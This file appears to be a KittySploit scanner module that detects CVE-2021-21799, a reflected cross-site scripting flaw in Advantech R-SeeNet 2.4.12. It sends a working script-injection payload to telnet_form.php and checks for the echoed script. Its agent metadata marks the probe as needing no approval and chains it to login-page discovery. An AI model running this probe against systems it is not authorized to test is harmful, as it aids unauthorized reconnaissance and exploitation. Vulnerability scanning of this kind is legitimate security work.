#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Advantech R-SeeNet 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Advantech R-SeeNet 2.4.12 - Cross-Site Scripting Detection',
        'description': 'Advantech R-SeeNet 2.4.12 contains a reflected cross-site scripting vulnerability in the telnet_form.php script functionality.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'r-seenet', 'advantech', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://talosintelligence.com/vulnerability_reports/TALOS-2021-1270',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-21799',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Live-Hack-CVE/CVE-2021-21799',
        ],
        'cve': 'CVE-2021-21799',
    }

    def run(self):
        r = self.http_request(method="GET", path='/php/telnet_form.php?hostname=%3C%2Ftitle%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Ctitle%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<title>Telnet </title><script>alert(document.domain)</script><title></title>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Advantech R-SeeNet 2.4.12 - Cross-Site Scripting detected",
                path='/php/telnet_form.php?hostname=%3C%2Ftitle%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Ctitle%3E',
            )
            return True
        return False

